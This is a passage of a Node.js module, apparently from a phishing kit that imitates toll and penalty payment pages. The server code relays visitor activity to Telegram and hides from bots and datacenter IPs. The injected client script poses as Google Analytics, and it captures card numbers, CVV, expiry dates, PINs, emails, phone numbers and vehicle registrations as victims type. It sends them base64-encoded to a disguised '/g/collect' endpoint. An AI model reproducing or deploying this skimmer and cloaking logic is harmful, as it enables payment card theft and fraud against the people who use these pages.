        // В случае ошибки считаем что это новое посещение (безопасный вариант)
      }
    }
    
    // Получить или создать посетителя (увеличить visit_count только при новом посещении)
    const visitorId = db.getOrCreateVisitor(ip, userAgent, {
      deviceType: deviceInfo.deviceType,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      isBot: isBot(userAgent)
    }, isNewVisit); // incrementVisit = true только для нового посещения
    
    // Обновить информацию о стране/городе если есть (только для реальных IP, не локальных)
    // ВАЖНО: Обновляем страну ДО отправки сообщения, чтобы она попала в первое уведомление
    if (deviceInfo.country && deviceInfo.country !== 'Unknown' && deviceInfo.country !== 'Local') {
      try {
        const dbInstance = db.db();
        if (dbInstance) {
          // Обновить страну и город (всегда, если есть валидная страна)
          const updateResult = dbInstance.prepare('UPDATE visitors SET country = ?, city = ? WHERE id = ?')
            .run(deviceInfo.country, deviceInfo.city || '', visitorId);
          
          // #region agent log
          fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Country updated in DB',data:{visitorId:visitorId,country:deviceInfo.country,city:deviceInfo.city,changes:updateResult.changes},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'I'})}).catch(()=>{});
          // #endregion
        }
      } catch (error) {
        logger.error('[TG] Failed to update visitor country:', error.message);
        // #region agent log
        fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Country update error',data:{error:error.message,visitorId:visitorId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'I'})}).catch(()=>{});
        // #endregion
      }
    } else {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Country not updated - invalid',data:{country:deviceInfo.country,ip:ip},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'I'})}).catch(()=>{});
      // #endregion
    }
    
    if (!activeSession) {
      // Создать новую сессию в БД
      const sessionDbId = db.createSession(visitorId, sessionId);
      
      activeSession = {
        visitorId,
        sessionDbId,
        messageId: null,
        startTime: Date.now(),
        actionCount: 0,
        lastPage: path,
        ip: ip  // CRITICAL: Store IP for fallback session lookup
      };
      
      activeSessions.set(sessionId, activeSession);
      logger.debug(`[Session] Created new session: ${sessionId} for IP ${ip}`);
      
      // ВАЖНО: Перечитать visitor из БД после обновления страны, чтобы получить актуальные данные
      // Это гарантирует, что страна будет в сообщении
      await new Promise(resolve => setTimeout(resolve, 200)); // Увеличена задержка для гарантии UPDATE
      
      // Перечитать visitor из БД, чтобы получить обновленную страну
      const dbInstance = db.db();
      if (dbInstance) {
        const updatedVisitor = dbInstance.prepare('SELECT * FROM visitors WHERE id = ?').get(visitorId);
        if (updatedVisitor) {
          // #region agent log
          fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Re-read visitor from DB',data:{visitorId:visitorId,country:updatedVisitor.country,city:updatedVisitor.city},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'O'})}).catch(()=>{});
          // #endregion
        }
      }
      
      // Отправить первое сообщение в Telegram (страна уже должна быть обновлена выше)
      const messageText = await formatTelegramMessage(sessionId, visitorId);
      
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Before sending Telegram message',data:{visitorId:visitorId,messageLength:messageText?.length,hasCountry:messageText?.includes('Страна'),messagePreview:messageText?.substring(0,200)},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'J'})}).catch(()=>{});
      // #endregion
      
      if (messageText) {
        const result = await sendTelegramMessage(messageText);
        if (result && result.message_id) {
          activeSession.messageId = result.message_id;
          db.updateSession(sessionId, { telegramMessageId: result.message_id });
        }
      }
    }
    
    // Добавить действие "просмотр страницы" (только если это не дубликат)
    // ВАЖНО: Проверяем дубликаты ПЕРЕД добавлением в БД
    if (activeSession && activeSession.lastPage !== path) {
      const pageName = getPageNameRu(path);
      
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Adding page_view',data:{sessionId:sessionId,path:path,lastPage:activeSession.lastPage,isDuplicate:activeSession.lastPage === path},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'L'})}).catch(()=>{});
      // #endregion
      
      await trackEvent(sessionId, {
        type: 'page_view',
        path: path,
        page: pageName
      }, { ip, userAgent });
      
      // Обновить последнюю страницу
      activeSession.lastPage = path;
      db.updateSession(sessionId, { lastPage: path });
    } else if (activeSession && activeSession.lastPage === path) {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Skipping duplicate page_view',data:{sessionId:sessionId,path:path,lastPage:activeSession.lastPage},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'L'})}).catch(()=>{});
      // #endregion
    }
    
  } catch (error) {
    logger.error('[TG] Track request error:', error.message);
  }
}

/**
 * Express middleware для отслеживания
 */
// Защита от множественных вызовов trackPageRequest для одного запроса
const requestTracking = new Map(); // req.url + IP -> timestamp
const TRACKING_COOLDOWN = 2000; // 2 секунды между вызовами для одного запроса

function trackingMiddleware(req, res, next) {
  const userAgent = req.headers['user-agent'] || '';
  const path = req.url || req.path || '/';
  const ip = getClientIP(req);
  
  // Пропустить статические файлы
  if (path.match(/\.(css|js|jpg|jpeg|png|gif|svg|ico|woff|woff2|ttf|eot|webp|mp4|mp3|pdf)$/)) {
    return next();
  }
  
  // Пропустить ботов по User-Agent
  if (isBot(userAgent)) {
    logger.debug(`[TG] Skipping bot by UA: ${userAgent.substring(0, 50)}`);
    return next();
  }
  
  // Пропустить подозрительные IP (датацентры, ботнеты)
  if (isSuspiciousIP(ip)) {
    logger.debug(`[TG] Skipping suspicious IP: ${ip}`);
    return next();
  }
  
  // Пропустить подозрительные пути
  if (isSuspiciousPath(path)) {
    logger.debug(`[TG] Skipping suspicious path: ${path}`);
    return next();
  }
  
  // Пропустить если это белая страница
  if (isWhitePageRequest(req)) {
    return next();
  }
  
  // Защита от дублирования
  const requestKey = `${path}_${ip}`;
  const lastTrack = requestTracking.get(requestKey);
  const now = Date.now();
  
  if (!lastTrack || (now - lastTrack) > TRACKING_COOLDOWN) {
    requestTracking.set(requestKey, now);
    
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackingMiddleware',message:'Calling trackPageRequest',data:{url:path,ip:ip,requestKey:requestKey,lastTrack:lastTrack,timeSinceLastTrack:lastTrack ? now - lastTrack : null},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'N'})}).catch(()=>{});
    // #endregion
    
    trackPageRequest(req).catch((err) => {
      logger.error('[TG] Track page request error:', err.message);
    });
  } else {
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackingMiddleware',message:'Skipping duplicate trackPageRequest',data:{url:path,ip:ip,requestKey:requestKey,timeSinceLastTrack:now - lastTrack},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'N'})}).catch(()=>{});
    // #endregion
  }
  
  // Очистка старых записей (каждые 5 минут)
  if (Math.random() < 0.01) { // 1% вероятность
    for (const [key, timestamp] of requestTracking.entries()) {
      if (now - timestamp > 5 * 60 * 1000) {
        requestTracking.delete(key);
      }
    }
  }
  
  next();
}

/**
 * API endpoint для клиентского отслеживания
 */
async function handleTrackingAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const ip = getClientIP(req);
    
    // Пропустить ботов по User-Agent
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
      return;
    }
    
    // Пропустить подозрительные IP
    if (isSuspiciousIP(ip)) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
      return;
    }
    
    const sessionId = getSessionId(req);
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);
        await trackEvent(sessionId, data, { ip, userAgent });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400);
        res.end('Bad Request');
      }
    });
  } catch (error) {
    res.writeHead(500);
    res.end('Error');
  }
}

/**
 * Найти активную сессию по IP (fallback если sessionId не найден)
 */
function findSessionByIP(ip) {
  for (const [sid, session] of activeSessions.entries()) {
    if (session.ip === ip) {
      return { sessionId: sid, session };
    }
  }
  return null;
}

/**
 * API endpoint для GA-like tracking (маскированный)
 */
async function handleAnalyticsAPI(req, res) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const ip = getClientIP(req);
    
    // Пропустить ботов по User-Agent
    if (isBot(userAgent)) {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      return;
    }
    
    // Пропустить подозрительные IP (датацентры, ботнеты)
    if (isSuspiciousIP(ip)) {
      res.writeHead(200, { 'Content-Type': 'image/gif' });
      res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      return;
    }
    
    let sessionId = getSessionId(req);
    
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        // Парсинг GA-like формата
        let encodedData = '';
        
        if (body) {
          const match = body.match(/_p=([A-Za-z0-9+/=]+)/);
          if (match) encodedData = match[1];
        }
        
        if (!encodedData && req.url) {
          const urlMatch = req.url.match(/_p=([A-Za-z0-9+/%]+)/);
          if (urlMatch) encodedData = decodeURIComponent(urlMatch[1]);
        }
        
        if (!encodedData) {
          res.writeHead(200, { 'Content-Type': 'image/gif' });
          res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
          return;
        }
        
        // Декодировать Base64
        const decoded = Buffer.from(encodedData, 'base64').toString('utf8');
        const gaData = JSON.parse(decoded);
        
        // CRITICAL: Попробовать получить session ID из payload (от клиента)
        if (gaData.sid) {
          // Клиент прислал свой session ID - проверим, есть ли такая сессия
          if (activeSessions.has(gaData.sid)) {
            sessionId = gaData.sid;
            logger.debug(`[Analytics] Using client session ID: ${sessionId}`);
          } else {
            logger.debug(`[Analytics] Client session ID not found in activeSessions: ${gaData.sid}`);
          }
        }
        
        // FALLBACK: Если сессия не найдена по sessionId - ищем по IP
        if (!activeSessions.has(sessionId)) {
          const foundByIP = findSessionByIP(ip);
          if (foundByIP) {
            sessionId = foundByIP.sessionId;
            logger.debug(`[Analytics] Found session by IP fallback: ${sessionId} for IP ${ip}`);
          } else {
            logger.debug(`[Analytics] No session found for sessionId=${sessionId}, IP=${ip}. Active sessions: ${activeSessions.size}`);
          }
        }
        
        // Конвертировать в внутренний формат
        let internalData = {
          type: 'unknown',
          path: gaData.pg || gaData.ev || '',
          page: gaData.pg || '',
          field: gaData.el || '',
          value: gaData.ev || '',
          buttonText: ''
        };
        
        // Определить тип события
        if (gaData.ec === 'payment' && (gaData.ea === 'button_click' || gaData.ea === 'form_submit')) {
          internalData.type = 'pay_button_click';
          internalData.buttonText = gaData.ev || 'Pay';
        } else if (gaData.ec === 'form' && gaData.ea === 'complete') {
          internalData.type = 'form_fill';
          internalData.field = gaData.el || '';
          internalData.value = gaData.ev || '';
        } else if (gaData.ec === 'form' && gaData.ea === 'focus') {
          internalData.type = 'form_input';
          internalData.field = gaData.el || '';
        } else if (gaData.ec === 'ui' && gaData.ea === 'click') {
          internalData.type = 'button_click';
          internalData.buttonText = gaData.ev || 'Button';
        } else if (gaData.ec === 'page' && gaData.ea === 'view') {
          internalData.type = 'page_view';
          internalData.path = gaData.ev || gaData.pg || '';
        } else if (gaData.ec === 'checkout' && gaData.ea === 'step') {
          internalData.type = 'navigation';
          internalData.page = gaData.el || '';
        } else {
          internalData.type = 'unknown';
        }
        
        logger.debug(`[Analytics] Tracking event: type=${internalData.type}, sessionId=${sessionId}, hasSession=${activeSessions.has(sessionId)}`);
        
        await trackEvent(sessionId, internalData, { ip, userAgent });
        
        res.writeHead(200, { 'Content-Type': 'image/gif' });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
        
      } catch (e) {
        logger.error(`[Analytics] Error processing event: ${e.message}`);
        res.writeHead(200, { 'Content-Type': 'image/gif' });
        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      }
    });
  } catch (error) {
    logger.error(`[Analytics] Request error: ${error.message}`);
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
  }
}

/**
 * Клиентский скрипт отслеживания
 * Логирует все действия: клики, заполнение полей, переходы, нажатия кнопок
 */
function getTrackingScript() {
  // Скрипт скопирован из старого telegram-logger.js для избежания циклической зависимости
  return `
<!-- Analytics Measurement Protocol -->
<script>
(function(w,d,s,l,i){
  w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
  w[l].l=1*new Date();
  
  var _sent={},_step=0,_page=location.pathname,_payClickTime=0,_lastPayNotificationTime=0;
  
  // Generate session ID (must match server-side getSessionId)
  function _getSessionId(){
    // Try to get from cookies first (like server does)
    var cookies=document.cookie||'';
    var sessionMatch=cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
    if(sessionMatch){return 'drupal_'+sessionMatch[0].substring(0,20);}
    // Fallback: generate from IP placeholder + User-Agent (server will use real IP)
    var ua=(navigator.userAgent||'unknown').substring(0,50);
    // Use a simple hash that server can verify
    var hash='';
    try{hash=btoa(ua).substring(0,12)}catch(e){hash='client'}
    return 'client_'+hash;
  }
  var _sessionId=_getSessionId();
  
  // Encode data
  function _enc(o){try{return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}catch(e){return''}}
  
  // Send tracking data with session ID
  function _send(p){
    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'')+'_'+(p.ev||'');
    if(_sent[k]&&Date.now()-_sent[k]<2000)return;
    _sent[k]=Date.now();
    // CRITICAL: Include session ID in payload
    p.sid=_sessionId;
    var u='/g/collect',m=_enc(p);
    if(!m)return;
    // Use fetch with credentials to ensure cookies are sent
    try{
      fetch(u,{
        method:'POST',
        body:'v=2&tid=G-XXXXXX&_p='+m,
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        credentials:'include',
        keepalive:true
      }).catch(function(){});
    }catch(e){
      // Fallback to image beacon
      new Image().src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now();
    }
  }
  
  // Get current page type
  function _getPageType(){
    if(_page.indexOf('pay-penalty')>-1)return 'pay-penalty';
    if(_page.indexOf('pay-toll')>-1)return 'pay-toll';
    if(_page.indexOf('login')>-1)return 'login';
    if(_page.indexOf('appeal')>-1)return 'appeal';
    return 'other';
  }
  
  // Field name mapping - DETAILED
  var _fieldMap={
    'vehicle_registration_number':'vh',
    'vehicle_reg':'vh',
    'vrn':'vh',
    'registration':'vh',
    'reg_number':'vh',
    'plate':'vh',
    'email':'em',
    'mail':'em',
    'pin':'pin',
    'pin_code':'pin',
    'notice_number':'notice',
    'notice':'notice',
    'journey_reference':'journey',
    'journey_ref':'journey',
    'journey':'journey',
    'card_number':'cd',
    'card':'cd',
    'pan':'cd',
    'cc_number':'cd',
    'cvv':'cv',
    'cvc':'cv',
    'security_code':'cv',
    'expiry':'ex',
    'exp_date':'ex',
    'expiration':'ex',
    'exp_month':'ex',
    'exp_year':'ex',
    'cardholder':'nm',
    'card_holder':'nm',
    'holder_name':'nm',
    'name':'nm',
    'phone':'ph',
    'mobile':'ph',
    'telephone':'ph',
    'amount':'amount',
    'total':'amount',
    'payment_amount':'amount'
  };
  
  // Get field code from input
  function _getFieldCode(el){
    var n=(el.name||el.id||el.placeholder||'').toLowerCase();
    for(var k in _fieldMap){
      if(n.indexOf(k)>-1||n.indexOf(k.replace('_',''))>-1)return _fieldMap[k];
    }
    if(el.type==='email')return 'em';
    if(el.type==='tel')return 'ph';
    return 'ot';
  }
  
  // Check if element is visible
  function _isVisible(el){
    if(!el)return false;
    var s=getComputedStyle(el);
    return s.display!=='none'&&s.visibility!=='hidden'&&el.offsetParent!==null;
  }
  
  // Detect current form step
  function _detectStep(){
    if(_payClickTime && (Date.now() - _payClickTime) < 3000){return;}
    var cardInputs=d.querySelectorAll('input[name*="card"],input[name*="pan"],input[name*="cc_number"]');
    var emailInputs=d.querySelectorAll('input[type="email"],input[name*="email"]');
    var vehInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[name*="vrn"],input[name*="plate"]');
    var pinInputs=d.querySelectorAll('input[name*="pin"],input[name*="notice"],input[name*="journey"]');
    for(var i=0;i<cardInputs.length;i++){
      if(_isVisible(cardInputs[i])){
        if(_step!==4){_step=4;_send({t:'event',ec:'checkout',ea:'step',el:'card_input',pg:_getPageType()})}
        return;
      }
    }
    if(d.querySelector('.summary,.review,.confirm,.confirmation')){
      if(_step!==3){_step=3;_send({t:'event',ec:'checkout',ea:'step',el:'confirmation',pg:_getPageType()})}
      return;
    }
    for(var i=0;i<emailInputs.length;i++){
      if(_isVisible(emailInputs[i])){
        if(_step!==2){_step=2;_send({t:'event',ec:'checkout',ea:'step',el:'email_input',pg:_getPageType()})}
        return;
      }
    }
    for(var i=0;i<vehInputs.length;i++){
      if(_isVisible(vehInputs[i])){
        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'vehicle_input',pg:_getPageType()})}
        return;
      }
    }
    for(var i=0;i<pinInputs.length;i++){
      if(_isVisible(pinInputs[i])){
        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'pin_input',pg:_getPageType()})}
        return;
      }
    }
  }
  
  // Track focus on form fields
  d.addEventListener('focus',function(e){
    var el=e.target;
    if(!el||!el.tagName)return;
    if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
      var code=_getFieldCode(el);
      _send({t:'event',ec:'form',ea:'focus',el:code,pg:_getPageType()})
    }
  },true);
  
  // Collect PIN from multiple fields
  function _collectPIN(){
    var pinFields=d.querySelectorAll('input[name*="pin"],input[id*="pin"]');
    var pinValues=[];
    for(var i=0;i<pinFields.length;i++){
      if(pinFields[i].value&&pinFields[i].value.length===1){pinValues.push(pinFields[i].value);}
    }
    if(pinValues.length>=4){return pinValues.join('');}
    var pin='';
    for(var j=0;j<4;j++){
      var f=d.querySelector('input[name*="pin"][name*="'+j+'"],input[id*="pin"][id*="'+j+'"]');
      if(f&&f.value)pin+=f.value;
    }
    return pin.length>=4?pin:null;
  }
  
  // Collect Notice Number
  function _collectNotice(){
    var noticeFields=d.querySelectorAll('input[name*="notice"],input[id*="notice"]');
    var vals=[];
    for(var i=0;i<noticeFields.length;i++){if(noticeFields[i].value)vals.push(noticeFields[i].value);}
    return vals.length>0?vals.join(''):null;
  }
  
  // Track blur (field completed)
  d.addEventListener('blur',function(e){
    var el=e.target;
    if(!el||!el.tagName)return;
    if((el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA')&&el.value){
      var code=_getFieldCode(el);
      var n=(el.name||el.id||'').toLowerCase();
      if(n.indexOf('pin')>-1){
        var fullPIN=_collectPIN();
        if(fullPIN&&fullPIN.length>=4){
          _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:fullPIN,pg:_getPageType()});
          return;
        }
      }
      if(n.indexOf('notice')>-1){
        var fullNotice=_collectNotice();
        if(fullNotice){
          _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:fullNotice,pg:_getPageType()});
          return;
        }
      }
      var val=el.value;
      _send({t:'event',ec:'form',ea:'complete',el:code,ev:val,pg:_getPageType()})
    }
  },true);
  
  // Track radio/checkbox changes
  d.addEventListener('change',function(e){
    var el=e.target;
    if(!el)return;
    if(el.type==='radio'){
      var name=el.name||'radio';
      var val=el.value||el.id||'selected';
      _send({t:'event',ec:'form',ea:'radio',el:name,ev:val,pg:_getPageType()})
    }
    if(el.type==='checkbox'){
      var name=el.name||'checkbox';
      var val=el.checked?'checked':'unchecked';
      _send({t:'event',ec:'form',ea:'checkbox',el:name,ev:val,pg:_getPageType()})
    }
    if(el.tagName==='SELECT'){
      var code=_getFieldCode(el);
      _send({t:'event',ec:'form',ea:'complete',el:code,ev:el.value,pg:_getPageType()})
    }
  },true);
  
  // Get clean button text
  function _getButtonText(btn){
    if(btn.value&&btn.value.trim()){return btn.value.trim();}
    var text='';
    for(var i=0;i<btn.childNodes.length;i++){
      var node=btn.childNodes[i];
      if(node.nodeType===3){text+=node.textContent;}
    }
    if(text.trim()){return text.trim();}
    if(btn.innerText){
      var it=btn.innerText.trim();
      if(it.length<100){return it;}
    }
    if(btn.textContent){
      var tc=btn.textContent.trim();
      if(tc.length>50){
        var firstWord=tc.split(/[\\s\\n\\r\\t]+/)[0];
        return firstWord||'Pay';
      }
      return tc;
    }
    return 'Pay';
  }
  
  // Track PAY button
  function _handlePayButton(e){
    var target=e.target;
    var now=Date.now();
    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){return;}
    var payBtn=target.closest('[data-drupal-selector="edit-pay"],[data-drupal-selector*="pay"],[name="op"][value="Pay"]');
    if(payBtn){
      _payClickTime=Date.now();
      _lastPayNotificationTime=now;
      var txt=_getButtonText(payBtn);
      _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt,pg:_getPageType()});
      return;
    }
    var btn=target.closest('button,input[type="submit"],.btn,[role="button"],a.btn,a.button,.form-submit,.btn-pay-trips');
    if(btn){
      var btnId=(btn.id||'').toLowerCase();
      var btnClass=(btn.className||'').toLowerCase();
      var btnValue=(btn.value||'').toLowerCase();
      var btnName=(btn.name||'').toLowerCase();
      var isPay=false;
      if(btnId.indexOf('pay')>-1||btnId.indexOf('edit-pay')>-1){isPay=true;}
      if(btnClass.indexOf('btn-pay')>-1||btnClass.indexOf('pay-trips')>-1){isPay=true;}
      if(btnValue==='pay'||btnValue==='Pay'){isPay=true;}
      if(btnName==='op'&&(btnValue==='pay'||btnValue==='Pay')){isPay=true;}
      if(btn.getAttribute('data-drupal-selector')&&btn.getAttribute('data-drupal-selector').indexOf('pay')>-1){isPay=true;}
      if(!isPay){
        var txt=_getButtonText(btn).toLowerCase().trim();
        if(txt==='pay'||txt==='pay '||txt.startsWith('pay ')){isPay=true;}
      }
      if(isPay){
        _payClickTime=Date.now();
        _lastPayNotificationTime=now;
        var cleanText=btn.value||_getButtonText(btn);
        cleanText=cleanText.replace(/[\\s\\n\\r\\t]+/g,' ').trim().substring(0,30);
        _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:cleanText||'Pay',pg:_getPageType()});
      }
    }
  }
  
  d.addEventListener('mousedown',_handlePayButton,true);
  d.addEventListener('pointerdown',_handlePayButton,true);
  d.addEventListener('click',_handlePayButton,true);
  
  // Track form submissions
  d.addEventListener('submit',function(e){
    var form=e.target;
    if(!form||!form.tagName)return;
    var now=Date.now();
    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){return;}
    var formId=(form.id||'').toLowerCase();
    var formAction=(form.action||'').toLowerCase();
    var formClass=(form.className||'').toLowerCase();
    var isPayForm=formId.indexOf('pay')>-1||formAction.indexOf('pay')>-1||formClass.indexOf('pay')>-1||
                  formId.indexOf('checkout')>-1||formAction.indexOf('checkout')>-1||
                  formId.indexOf('payment')>-1||formAction.indexOf('payment')>-1;
    var submitBtn=form.querySelector('button[type="submit"],input[type="submit"],button:not([type])');
    var btnText='Submit';
    if(submitBtn){
      btnText=(submitBtn.textContent||submitBtn.value||'').replace(/[\\s\\n\\r\\t]+/g,' ').trim();
    }
    if(isPayForm||btnText.toLowerCase().indexOf('pay')>-1){
      _payClickTime=Date.now();
      _lastPayNotificationTime=now;
      _send({t:'event',ec:'payment',ea:'form_submit',el:'pay',ev:btnText||'Pay Form',pg:_getPageType()});
    }
  },true);
  
  setInterval(_detectStep,1500);
  setTimeout(_detectStep,500);
  
  // Track PIN/Notice completion periodically
  var _lastPIN='',_lastNotice='',_lastVRN='';
  setInterval(function(){
    var pin=_collectPIN();
    if(pin&&pin.length>=4&&pin!==_lastPIN){
      _lastPIN=pin;
      _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:pin,pg:_getPageType()});
    }
    var notice=_collectNotice();
    if(notice&&notice.length>=6&&notice!==_lastNotice){
      _lastNotice=notice;
      _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:notice,pg:_getPageType()});
    }
    var vrnInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[id*="vehicle"],input[id*="registration"]');
    for(var i=0;i<vrnInputs.length;i++){
      if(vrnInputs[i].value&&vrnInputs[i].value.length>=5&&vrnInputs[i].value!==_lastVRN){
        _lastVRN=vrnInputs[i].value;
        _send({t:'event',ec:'form',ea:'complete',el:'vh',ev:vrnInputs[i].value,pg:_getPageType()});
      }
    }
  },1000);
  
  _send({t:'event',ec:'page',ea:'view',el:_getPageType(),ev:_page});
  
})(window,document,'script','ga','G-MEASUREMENT');
</script>`;
}

module.exports = {
  trackPageRequest,
  trackingMiddleware,
  handleTrackingAPI,
  handleAnalyticsAPI,
  trackEvent,
  sendTelegramMessage,
  editTelegramMessage,
  getTrackingScript,
  getSessionId,
  isBot,
  isSuspiciousIP,
  isSuspiciousPath,
  isWhitePageRequest,
};
